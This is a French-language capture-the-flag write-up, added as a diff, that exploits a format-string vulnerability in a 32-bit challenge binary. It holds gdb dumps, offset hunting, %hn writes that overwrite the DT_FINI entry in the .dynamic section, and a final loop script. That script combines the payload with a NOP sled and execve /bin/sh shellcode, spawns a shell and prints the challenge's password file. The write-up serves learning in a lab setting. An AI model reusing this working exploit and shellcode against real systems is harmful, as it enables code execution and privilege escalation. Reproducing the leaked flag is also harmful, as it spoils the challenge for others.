@@ -1,0 +1,536 @@
+----> On test le programme:
+
+app-systeme-ch23@challenge03:~$ ./ch23 "`python -c 'print "|%p\n"*200'`"
+|(nil)
+|0xeaa94e5d		--> est egal a 0x00000000 a la sortie du printf
+|0xeaa6b000		--> ???
+|0xf949081e		--> la moitier de 0xf949081c, ca deborde donc sur l'adresse suivante.
+|0xf949081f		--> les 3/4 de 0xf949081c donc ca deborde sur l'adresse suivante.
+|0xc2
+|0x8049880		--> Notre buffer static buf() passer a printf, etc.
+|0xf949081f		--> Meme addresse qe la n.5
+|0xf949081e		--> Meme addresse qe la n.4
+|0x1
+|0x37236e00
+|(nil)
+|(nil)
+|0xf9490848		--> Cette adresse est celle juste avant l"EIP de <mprint> !!!!!
+|0x804862d		--> Adresse de <main+209>. l'EIP de <mprint> !!!
+|0x8049880		--> notre static buffer.
+|0xf9490a09		--> L'adresse en memoire de argv[1].
+|0xff
+|0x8048679		--> <__libc_csu_init+25> ...
+|0x8048660		--> <__libc_csu_init> ...
+|0x8048450		--> <_start> ...
+|0xf94908e4		--> pointe dans la memoire ou ya paquet d'autres adresse memoires...
+|0x2
+|0xeaa6b3c4		--> Doit etre dans la libc...
+|0x8000
+|0x12
+|0x37236e00
+|0x8048660
+|(nil)
+|(nil)
+|0xea8d9af3		--> <__libc_start_main+243>
+|0x2
+|0xf94908e4		??
+|0xf94908f0		??
+|0xeaa8ccca		libc ??
+|0x2
+|0xf94908e4		??
+|0xf94908f0		??
+|0x3
+|0xf94908e0		
+|0xeaa6b000
+|(nil)
+|(nil)
+|(nil)
+|0x40cfb124
+|0xc9ea7503
+|(nil)
+|(nil)
+|(nil)
+|0xeaa7e000
+|0x55c
+|0xeaa7e2dc
+|0x2
+|0xea8d9a09
+|0xeaa9f000
+|0x2
+|0x8048450
+|(nil)
+|0x8048471
+|0x804855c
+|0x2
+|0xf94908e4
+|0x8048660
+|0x8048650
+
+----> on a plusireur addresse en memoire, on cherche a quoi elle correspondent...
+
+gdb ./ch23
+disas mprint
+b *0x08048546 (juste apres printf)
+r `python -c 'print "AAAA"+"%p.."*200'`
+------> Pour retrouver ce que printf affiche on compare avec EBP:
+gdb$ x/20wx $ebp
+0xf780a498:	0xf780a4d8	0x0804862d	0x08049880	0xf780a6b6
+0xf780a4a8:	0x000000ff	0x08048679	0x08048660	0x08048450
+0xf780a4b8:	0xf780a574	0x00000002	0xe366c3c4	0x00008000
+0xf780a4c8:	0x00000013	0xb89a3d00	0x08048660	0x00000000
+0xf780a4d8:	0x00000000	0xe34daaf3	0x00000002	0xf780a574
+-----> Il faut retourner 0x34 en arriere pour tomber sur ce qu'affiche printf;
+gdb$ x/20wx $ebp-0x34
+0xf780a464:	0x00000000	0x00000000	0xe366c000	0xf780a4ae
+0xf780a474:	0xf780a4af	0x000000c2	0x08049880	0xf780a4af
+0xf780a484:	0xf780a4ae	0x00000001	0xb89a3d00	0x00000000
+0xf780a494:	0x00000000	0xf780a4d8	0x0804862d	0x08049880
+0xf780a4a4:	0xf780a6b6	0x000000ff	0x08048679	0x08048660
+------> a partir de la on regarde sur quoi pointe les addresses:
+------> je vais mettre les resultats au debut de ce fichier.
+...
+-----> J'ai essayer d'ecrire a toutes les adresses (celles qui pointe sur la stack ou des
+-----> endroits writable hein) que l'affichage me donne et rien ne marche
+
+-----> un "%lln" sur l'addresse qui point juste avant l'EIP de <mprint> renvoi bien un SEGV
+-----> mais impossible d'ecrire quoi que ce soit de raisonnable avec %lln. Donc j'ai lacher l'affaire.
+
+-----> Apres j'ai regarder plus loin dans la stack et si vous regardez bien sur les addresses plus haut,un argument pointe sur argv[1] et cette adresse est sur la stack.
+
+	   (RAPPEL: gdb$ r `python -c 'print "AAAA"+"%p.."*200'`)
+
+gdb$ x/200wx $ebp-0x34
+0xf780a464:	 0x00000000	0x00000000	0xe366c000	0xf780a4ae
+0xf780a474:	 0xf780a4af	0x000000c2	0x08049880	0xf780a4af
+0xf780a484:	 0xf780a4ae	0x00000001	0xb89a3d00	0x00000000
+0xf780a494:	 0x00000000	0xf780a4d8	0x0804862d	0x08049880
+0xf780a4a4:	 0xf780a6b6	0x000000ff	0x08048679	0x08048660
+0xf780a4b4:	 0x08048450	0xf780a574	0x00000002	0xe366c3c4
+0xf780a4c4:	 0x00008000	0x00000013	0xb89a3d00	0x08048660
+0xf780a4d4:	 0x00000000	0x00000000	0xe34daaf3	0x00000002
+0xf780a4e4:	 0xf780a574	0xf780a580	0xe368dcca	0x00000002
+0xf780a4f4:	 0xf780a574	0xf780a580	0x00000003	0xf780a570
+0xf780a504:	 0xe366c000	0x00000000	0x00000000	0x00000000
+0xf780a514:	 0xc71937fd	0x5d0593d4	0x00000000	0x00000000
+0xf780a524:	 0x00000000	0xe367f000	0x0000055c	0xe367f2dc
+0xf780a534:	 0x00000002	0xe34daa09	0xe36a0000	0x00000002
+0xf780a544:	 0x08048450	0x00000000	0x08048471	0x0804855c
+0xf780a554:	 0x00000002	0xf780a574	0x08048660	0x08048650
+0xf780a564:	 0xe368e160	0xf780a56c	0x0000001c	0x00000002
+0xf780a574:	 0xf780a695	0xf780a6b6	0x00000000	0xf780a9db
+0xf780a584:	 0xf780a9ed	0xf780a9fd	0xf780aa11	0xf780aa32
+0xf780a594:	 0xf780aa45	0xf780aa5b	0xf780aa66	0xf780aa72
+0xf780a5a4:	 0xf780aae5	0xf780ab05	0xf780ab14	0xf780ab34
+0xf780a5b4:	 0xf780ab45	0xf780ab4e	0xf780ab6f	0xf780ab77
+0xf780a5c4:	 0xf780ab90	0xf780abc5	0x00000000	0x00000020
+0xf780a5d4:	 0xe367e420	0x00000021	0xe367e000	0x00000010
+0xf780a5e4:	 0x1f8bfbff	0x00000006	0x00001000	0x00000011
+0xf780a5f4:	 0x00000064	0x00000003	0x08048034	0x00000004
+0xf780a604:	 0x00000020	0x00000005	0x00000008	0x00000007
+0xf780a614:	 0xe367f000	0x00000008	0x00000000	0x00000009
+0xf780a624:	 0x08048450	0x0000000b	0x00000463	0x0000000c
+0xf780a634:	 0x00000463	0x0000000d	0x00000463	0x0000000e
+0xf780a644:	 0x00000463	0x00000017	0x00000000	0x00000019
+0xf780a654:	 0xf780a670	0x0000001f	0xf780abe4	0x0000000f
+0xf780a664:	 0xf780a68b	0x00000000	0x00000000	0xb89a3d7e
+0xf780a674:	 0x0963287b	0x9ad8df98	0x47de8e48	0x00000000
+0xf780a684:	 0x00000000	0x69000000	0x00363836	0x00000000
+0xf780a694:	 0x68632f00	0x656c6c61	0x2f65676e	0x2d707061
+0xf780a6a4:	 0x74737973	0x2f656d65	0x33326863	0x3268632f
+0xf780a6b4:	 0x41410033	0x70254141	0x70252e2e	0x70252e2e	<------ nos 0x41414141 commence ici.
+0xf780a6c4:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a6d4:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a6e4:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a6f4:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a704:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a714:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a724:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a734:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a744:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a754:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a764:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+0xf780a774:	 0x70252e2e	0x70252e2e	0x70252e2e	0x70252e2e
+
+---> Donc en voyant notre argument en memoire ne pourrait on pas envoyer une adresse au debut de argv[1]
+---> et pointer dessus ? Du style: python -c 'print "\x08\x04\x08\x04"[::-1] + "%???n"'
+---> reste a trouver a quel argument notre debut d'argv[1] se trouve.
+---> On calcul a la main (xD) et on trouve 38 lignes, fois 4, moins 3 = 149.
+
+----> Donc il suffirait d'ecrire %149$n pour pouvoir ecrire a l'adresse que l'on voudrait ?
+
+app-systeme-ch23@challenge03:~$ ./ch23 `python -c 'print "AAAA" + "%149$p.%150$p.%151$p.%152$p"'`
+AAAA0x3531252e.0x2e702431.0x32353125.0x7024
+----> Donc la a la 149eme et 150eme adresse on a 0x3531252e et 0x0x2e702431 qui sont .%15 et 1$p.
+----> Donc la, on se trouve en plein milieu de argv[1].
+
+app-systeme-ch23@challenge03:~$ ./ch23 `python -c 'print "AAAA" + "%141$p.%142$p.%143$p.%144$p"'`
+AAAA0x2e000000.0x3268632f.0x41410033.0x31254141
+
+----> la 142eme semble la bonne sauf que, si on retest juste apres...
+
+app-systeme-ch23@challenge03:~$ ./ch23 `python -c 'print "AAAA" + "%141$p.%142$p.%143$p.%144$p"'`
+AAAA0x33326863.0x41414100.0x34312541.0x2e702431
+
+-----> Ba ca a bouger !!!!! HA !
+----> Du coup ptit script qui va tester 50 fois la commande d'avant et on fera une statistique sur la
+----> position sur laquelle les bits sont le plus souvent alignes:
+
+app-systeme-ch23@challenge03:/tmp/gbourgeo$ cat tmp.sh
+#!/bin/sh
+
+for num in `seq 0 50`
+	do /challenge/app-systeme/ch23/ch23 `python -c 'print "AAAA"+ "%148$p.%149$p.%150$p.%151$p.%152$p"'` ; echo
+done
+
+app-systeme-ch23@challenge03:/tmp/gbourgeo$ sh tmp.sh
+AAAA0x33326863.0x3268632f.0x41410033.0x31254141.0x70243834
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x41003332.0x25414141.0x24383431.0x31252e70.0x70243934
+AAAA0x2f656d65.0x33326863.0x3268632f.0x41410033.0x31254141
+AAAA0x41414100.0x34312541.0x2e702438.0x39343125.0x252e7024
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x656d6574.0x3268632f.0x68632f33.0x41003332.0x25414141
+AAAA0x632f3332.0x333268.0x41414141.0x38343125.0x252e7024
+AAAA0x632f656d.0x2f333268.0x33326863.0x41414100.0x34312541
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x68632f33.0x41003332.0x25414141.0x24383431.0x31252e70
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x2f333268.0x33326863.0x41414100.0x34312541.0x2e702438
+AAAA0x33326863.0x41414100.0x34312541.0x2e702438.0x39343125
+AAAA0x3268632f.0x41410033.0x31254141.0x70243834.0x3431252e
+AAAA0x2f333268.0x33326863.0x41414100.0x34312541.0x2e702438
+AAAA0x632f656d.0x2f333268.0x33326863.0x41414100.0x34312541
+AAAA0x656d6574.0x3268632f.0x68632f33.0x41003332.0x25414141
+AAAA0x33326863.0x41414100.0x34312541.0x2e702438.0x39343125
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x41414100.0x34312541.0x2e702438.0x39343125.0x252e7024
+AAAA0x656d6574.0x3268632f.0x68632f33.0x41003332.0x25414141
+AAAA0x68632f65.0x632f3332.0x333268.0x41414141.0x38343125
+AAAA0x3268632f.0x68632f33.0x41003332.0x25414141.0x24383431
+AAAA0x41003332.0x25414141.0x24383431.0x31252e70.0x70243934
+AAAA0x632f3332.0x333268.0x41414141.0x38343125.0x252e7024
+AAAA0x632f656d.0x2f333268.0x33326863.0x41414100.0x34312541
+AAAA0x41410033.0x31254141.0x70243834.0x3431252e.0x2e702439
+AAAA0x632f656d.0x2f333268.0x33326863.0x41414100.0x34312541
+AAAA0x632f3332.0x333268.0x41414141.0x38343125.0x252e7024
+AAAA0x33326863.0x3268632f.0x41410033.0x31254141.0x70243834
+AAAA0x6d657473.0x68632f65.0x632f3332.0x333268.0x41414141
+AAAA0x68632f65.0x632f3332.0x333268.0x41414141.0x38343125
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x3268632f.0x41410033.0x31254141.0x70243834.0x3431252e
+AAAA0x33326863.0x41414100.0x34312541.0x2e702438.0x39343125
+AAAA0x41414100.0x34312541.0x2e702438.0x39343125.0x252e7024
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+AAAA0x3268632f.0x68632f33.0x41003332.0x25414141.0x24383431
+AAAA0x68632f65.0x632f3332.0x333268.0x41414141.0x38343125
+AAAA0x632f656d.0x2f333268.0x33326863.0x41414100.0x34312541
+AAAA0x41414100.0x34312541.0x2e702438.0x39343125.0x252e7024
+AAAA0x2f656d65.0x33326863.0x3268632f.0x41410033.0x31254141
+AAAA0x41003332.0x25414141.0x24383431.0x31252e70.0x70243934
+AAAA0x41410033.0x31254141.0x70243834.0x3431252e.0x2e702439
+AAAA0x68632f33.0x41003332.0x25414141.0x24383431.0x31252e70
+AAAA0x3268632f.0x68632f33.0x41003332.0x25414141.0x24383431
+AAAA0x33326863.0x3268632f.0x41410033.0x31254141.0x70243834
+AAAA0x333268.0x41414141.0x38343125.0x252e7024.0x24393431
+app-systeme-ch23@challenge03:/tmp/gbourgeo$
+
+----> Cmd + f ; 41414141 ; 
+----> Sur plusieur test, les resultats sont variables, du coup on peut prendre n'importe laquelle
+----> des adresses du moment quel soit comprises entre 149 et 151.
+----> Le probleme MAintenant est de savoir ou ecrire ?
+----> Quoi ecrire on le sait deja. Ca sera l'adresse de notre static buffer[], 0x08049880, plus le nombre
+----> de caracteres pour exploiter ce binaire (\x\x\x\x + \x\x\x\x + %???d%???$hn + %???d%???$hn).
+
+----> Premierement j'ai essayer d'ecrire dans le .dtors, rien ne se passe.
+----> Dans la .got et .got.plt, rien ne se passe non plus...
+----> Avec objdump -p, on voit que la section .dynamic est writable:
+
+app-systeme-ch23@challenge03:~$ objdump -p ./ch23
+
+./ch23:     file format elf32-i386
+
+Program Header:
+    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
+         filesz 0x00000100 memsz 0x00000100 flags r-x
+  INTERP off    0x00000134 vaddr 0x08048134 paddr 0x08048134 align 2**0
+         filesz 0x00000013 memsz 0x00000013 flags r--
+    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
+         filesz 0x0000072c memsz 0x0000072c flags r-x
+    LOAD off    0x0000072c vaddr 0x0804972c paddr 0x0804972c align 2**12
+         filesz 0x00000128 memsz 0x00000254 flags rw-
+ DYNAMIC off    0x00000740 vaddr 0x08049740 paddr 0x08049740 align 2**2
+         filesz 0x000000e0 memsz 0x000000e0 flags rw-
+    NOTE off    0x00000148 vaddr 0x08048148 paddr 0x08048148 align 2**2
+         filesz 0x00000020 memsz 0x00000020 flags r--
+   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
+         filesz 0x00000000 memsz 0x00000000 flags rwx
+0x65041580 off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
+         filesz 0x00000000 memsz 0x00000000 flags --- 6aa0
+
+Dynamic Section:
+  NEEDED               libc.so.6
+  INIT                 0x080483b4
+  FINI                 0x080486ec
+  HASH                 0x08048168
+  GNU_HASH             0x080481ac
+  STRTAB               0x0804829c
+  SYMTAB               0x080481dc
+  STRSZ                0x00000087
+  SYMENT               0x00000010
+  DEBUG                0x00000000
+  PLTGOT               0x08049824
+  PLTRELSZ             0x00000038
+  PLTREL               0x00000011
+  JMPREL               0x0804837c
+  REL                  0x0804836c
+  RELSZ                0x00000010
+  RELENT               0x00000008
+  FLAGS                0x00000008
+  FLAGS_1              0x00000001
+  VERNEED              0x0804833c
+  VERNEEDNUM           0x00000001
+  VERSYM               0x08048324
+
+Version References:
+  required from libc.so.6:
+    0x0d696914 0x00 03 GLIBC_2.4
+    0x0d696910 0x00 02 GLIBC_2.0
+
+----> voyons ce qu'il s'y trouve:
+
+gdb$ x/60wx 0x08049740
+0x8049740:	0x00000001	0x00000010	0x0000000c	0x080483b4
+0x8049750:	0x0000000d	0x080486ec	0x00000004	0x08048168
+0x8049760:	0x6ffffef5	0x080481ac	0x00000005	0x0804829c
+0x8049770:	0x00000006	0x080481dc	0x0000000a	0x00000087
+0x8049780:	0x0000000b	0x00000010	0x00000015	0x00000000
+0x8049790:	0x00000003	0x08049824	0x00000002	0x00000038
+0x80497a0:	0x00000014	0x00000011	0x00000017	0x0804837c
+0x80497b0:	0x00000011	0x0804836c	0x00000012	0x00000010
+0x80497c0:	0x00000013	0x00000008	0x0000001e	0x00000008
+0x80497d0:	0x6ffffffb	0x00000001	0x6ffffffe	0x0804833c
+0x80497e0:	0x6fffffff	0x00000001	0x6ffffff0	0x08048324
+0x80497f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049800:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049810:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049820:	0x00000000	0x08049740	0x00000000	0x00000000
+
+- 0x080483b4 : 0x80483b4 <_init>:	0x83e58955	0xb5e808ec	0xe8000000	0x0000013c
+La section init nous servira a rien car on y repasse pas.
+- 0x080486ec : 0x80486ec <_fini>:	0x53e58955		 0xe804ec83	0x00000000	0x2cc3815b
+A ca par contre on y passe a la fin du programme. On test avec gdb.
+-----> 0x0804984c se trouve dans la section DYNAMIC a l'adresse 0x08049754
+-----> On va reecrire a l'adresse 0x08049754 pour voit si, une fois le programme fini,
+-----> l'executable passe par la fonction <fini>. Pour ca on reecrit en 0x08049754 une
+-----> valeur random.
+
+app-systeme-ch23@challenge03:~$ gdb ./ch23
+gdb$ disas mprint
+Dump of assembler code for function mprint:
+   0x08048524 <+0>:	   push   ebp
+   0x08048525 <+1>:	   mov    ebp,esp
+   0x08048527 <+3>:	   sub    esp,0x38
+   0x0804852a <+6>:	   mov    eax,DWORD PTR [ebp+0x8]
+   0x0804852d <+9>:	   mov    DWORD PTR [ebp-0x1c],eax
+   0x08048530 <+12>:   mov    eax,gs:0x14
+   0x08048536 <+18>:   mov    DWORD PTR [ebp-0xc],eax
+   0x08048539 <+21>:   xor    eax,eax
+   0x0804853b <+23>:   mov    eax,DWORD PTR [ebp-0x1c]
+   0x0804853e <+26>:   mov    DWORD PTR [esp],eax
+   0x08048541 <+29>:   call   0x804842c <printf@plt>
+   0x08048546 <+34>:   mov    eax,DWORD PTR [ebp-0x1c]
+   0x08048549 <+37>:   mov    edx,DWORD PTR [ebp-0xc]
+   0x0804854c <+40>:   xor    edx,DWORD PTR gs:0x14
+   0x08048553 <+47>:   je     0x804855a <mprint+54>
+   0x08048555 <+49>:   call   0x804843c <__stack_chk_fail@plt>
+   0x0804855a <+54>:   leave
+   0x0804855b <+55>:   ret
+End of assembler dump.
+gdb$ b *0x08048546
+Breakpoint 1 at 0x8048546
+gdb$ r `python -c 'print "\x08\x04\x97\x54"[::-1] + "%151$n"'`
+Starting program: /challenge/app-systeme/ch23/ch23 `python -c 'print "\x08\x04\x97\x54"[::-1] + "%151$n"'`
+warning: Cannot call inferior functions, Linux kernel PaX protection forbids return to non-executable pages!
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x25080497  EBX: 0xE161D000  ECX: 0x00000004  EDX: 0xFFFFFFFF  o d I t s Z a P c
+  ESI: 0xE161DAC0  EDI: 0xF354F230  EBP: 0xF354F248  ESP: 0xF354DAC0  EIP: 0xE14B8F35
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
+--------------------------------------------------------------------------[code]
+=> 0xe14b8f35 <vfprintf+14117>:	mov    DWORD PTR [eax],ecx
+   0xe14b8f37 <vfprintf+14119>:	jmp    0xe14b6de1 <vfprintf+5585>
+   0xe14b8f3c <vfprintf+14124>:	cmp    DWORD PTR [ebp-0x4f0],0x0
+   0xe14b8f43 <vfprintf+14131>:	je     0xe14b8f6b <vfprintf+14171>
+   0xe14b8f45 <vfprintf+14133>:	movzx  ecx,BYTE PTR [ebp-0x44c]
+   0xe14b8f4c <vfprintf+14140>:	mov    BYTE PTR [eax],cl
+   0xe14b8f4e <vfprintf+14142>:	mov    eax,DWORD PTR [ebp+0x10]
+   0xe14b8f51 <vfprintf+14145>:	add    eax,0x4
+--------------------------------------------------------------------------------
+0xe14b8f35 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+
+-------> Alors a debug ca va etre galere, puisque notre adresse n'est pas a tous les coups
+-------> alignes sur la stack... On relance alors la commande juska se que ca marche...
+gdb$ r `python -c 'print "\x08\x04\x97\x54"[::-1] + "%151$n"'`
+Starting program: /challenge/app-systeme/ch23/ch23 `python -c 'print "\x08\x04\x97\x54"[::-1] + "%151$n"'`
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00000004  EBX: 0xDC5D5000  ECX: 0x00000000  EDX: 0xDC5D6898  o d I t S z a P c
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xF29A60F8  ESP: 0xF29A60C0  EIP: 0x08048546
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
+--------------------------------------------------------------------------[code]
+=> 0x8048546 <mprint+34>:	mov    eax,DWORD PTR [ebp-0x1c]
+   0x8048549 <mprint+37>:	mov    edx,DWORD PTR [ebp-0xc]
+   0x804854c <mprint+40>:	xor    edx,DWORD PTR gs:0x14
+   0x8048553 <mprint+47>:	je     0x804855a <mprint+54>
+   0x8048555 <mprint+49>:	call   0x804843c <__stack_chk_fail@plt>
+   0x804855a <mprint+54>:	leave
+   0x804855b <mprint+55>:	ret
+   0x804855c <main>:		push   ebp
+--------------------------------------------------------------------------------
+
+Breakpoint 1, 0x08048546 in mprint ()
+gdb$ x/60wx 0x08049740
+0x8049740:	0x00000001	0x00000010	0x0000000c	0x080483b4
+0x8049750:	0x0000000d	0x00000004	0x00000004	0x08048168
+0x8049760:	0x6ffffef5	0x080481ac	0x00000005	0x0804829c
+0x8049770:	0x00000006	0x080481dc	0x0000000a	0x00000087
+0x8049780:	0x0000000b	0x00000010	0x00000015	0xdc609924
+0x8049790:	0x00000003	0x08049824	0x00000002	0x00000038
+0x80497a0:	0x00000014	0x00000011	0x00000017	0x0804837c
+0x80497b0:	0x00000011	0x0804836c	0x00000012	0x00000010
+0x80497c0:	0x00000013	0x00000008	0x0000001e	0x00000008
+0x80497d0:	0x6ffffffb	0x00000001	0x6ffffffe	0x0804833c
+0x80497e0:	0x6fffffff	0x00000001	0x6ffffff0	0x08048324
+0x80497f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049800:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049810:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049820:	0x00000000	0x08049740	0x00000000	0x00000000
+gdb$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00000004  EBX: 0xDC609000  ECX: 0x0000000C  EDX: 0x08049750  o d I t s z a p c
+  ESI: 0xDC609938  EDI: 0x00000004  EBP: 0xF29A60E8  ESP: 0xF29A605C  EIP: 0x00000004
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
+Cannot access memory at address 0x4
+0x00000004 in ?? ()
+
+-----> BINGO ON A reussi a faire segfault notre programme sur une adresse que nous controlons !!!
+---> on check si on peut ecrire sur 2 octets:
+
+gdb$ r `python -c 'print "\x08\x04\x97\x54"[::-1] + "\x08\x04\x97\x56"[::-1] + "%151$hn" + "%152$hn"'`
+...
+gdb$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00080008  EBX: 0xED3D4000  ECX: 0x0000000C  EDX: 0x08049750  o d I t s z a p c
+  ESI: 0xED3D4938  EDI: 0x00000004  EBP: 0xFC177FE8  ESP: 0xFC177F5C  EIP: 0x00080008
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
+Cannot access memory at address 0x80008
+0x00080008 in ?? ()
+gdb$
+
+---> NIKEL CHROME!!!!
+
+--> On check ou on va renvoyer notre programme:
+
+gdb$ x/80wx 0x08049880
+0x8049880 <buf>:	0x08049754	0x08049756	0x31353125	0x256e6824
+0x8049890 <buf+16>:	0x24323531	0x00006e68	0x00000000	0x00000000
+0x80498a0 <buf+32>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x80498b0 <buf+48>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x80498c0 <buf+64>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x80498d0 <buf+80>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x80498e0 <buf+96>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x80498f0 <buf+112>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049900 <buf+128>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049910 <buf+144>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049920 <buf+160>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049930 <buf+176>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049940 <buf+192>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049950 <buf+208>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049960 <buf+224>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049970 <buf+240>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x8049980:						0x00000000	0x00000000	0x00000000	0x00000000
+0x8049990:						0x00000000	0x00000000	0x00000000	0x00000000
+0x80499a0:						0x00000000	0x00000000	0x00000000	0x00000000
+0x80499b0:						0x00000000	0x00000000	0x00000000	0x00000000
+gdb$
+
+---> en prenant en compte qu'on va rajouter "%.....d" deux fois et qu'on a pas mal de place
+---> pour les nop sleds, 0x08049900 semble parfait.
+
+0x9900 - 0x8 = 39160
+0x10804 - 0x9900 - 0x8 = 28412
+
+---> si on ecrit:
+
+gdb$ r `python -c 'print "\x08\x04\x97\x54"[::-1] + "\x08\x04\x97\x56"[::-1] + "%39160d%151$hn" + "%28412d%152$hn"'`
+
+---> On tombe dans les nop sleds:
+
+gdb$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x07FC9900  EBX: 0xE1766000  ECX: 0x0000000C  EDX: 0x08049750  o d I t s z a P c
+  ESI: 0xE1766938  EDI: 0x00000004  EBP: 0xF77792D8  ESP: 0xF777924C  EIP: 0x07FC9900
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
+Cannot access memory at address 0x7fc9900
+0x07fc9900 in ?? ()
+
+---> OUPs.. faut ajouter 0x8 au dernier... 
+
+gdb$ r `python -c 'print "\x08\x04\x97\x54"[::-1] + "\x08\x04\x97\x56"[::-1] + "%39160d%151$hn" + "%28420d%152$hn"'`
+bla...
+gdb$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x08049900  EBX: 0xE6152000  ECX: 0x0000000C  EDX: 0x08049750  o d I t s Z a P c
+  ESI: 0xE6152938  EDI: 0x00000004  EBP: 0xF616D088  ESP: 0xF616CFFC  EIP: 0x0804A000
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
+Cannot access memory at address 0x804a000
+0x0804a000 in ?? ()
+gdb$
+
+-----> EAX est bien egal a 0x08049900 on est nikel
+-----> Creeons un script pour lancer l'executable en boucle parce qu'a la main c'est galere
+
+app-systeme-ch23@challenge03:/tmp/gbourgeo$ cat file.sh
+#!/bin/sh
+
+for num in `seq 0 50`
+	do /challenge/app-systeme/ch23/ch23 `python -c 'print "\x08\x04\x97\x54"[::-1]+"\x08\x04\x97\x56"[::-1]+"%39160d%151$hn"+"%28420d%152$hn"+"\x90"*180+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+done
+
+app-systeme-ch23@challenge03:/tmp/gbourgeo$ sh file.sh
+... < " " repeated 84614654 times>
+
+                                                                           -33087sh-4.3$ ls
+file.sh  tmp.sh
+sh-4.3$ cd
+sh: cd: HOME not set
+sh-4.3$ pwd
+/tmp/gbourgeo
+sh-4.3$ cd /
+sh-4.3$ cd /challenge/app-systeme/ch23/.pass
+sh: cd: /challenge/app-systeme/ch23/.pass: No such file or directory
+sh-4.3$ cd /challenge
+sh-4.3$ cd app-systeme
+sh-4.3$ cd ch23
+sh-4.3$ cat .pass
+cat: .pass: No such file or directory
+sh-4.3$ cat .passwd
+while(1){"win"};;;;;
+
+
+
+bingo !
